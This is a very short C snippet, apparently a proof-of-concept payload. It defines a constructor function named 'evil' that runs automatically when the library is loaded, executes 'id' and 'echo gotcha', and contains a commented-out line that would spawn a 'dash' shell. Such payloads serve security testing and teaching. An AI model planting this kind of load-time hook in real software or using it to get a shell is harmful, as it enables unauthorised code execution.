int __attribute__((constructor)) evil(){
  system("id");
  system("echo gotcha");
  /*system("dash");*/
}
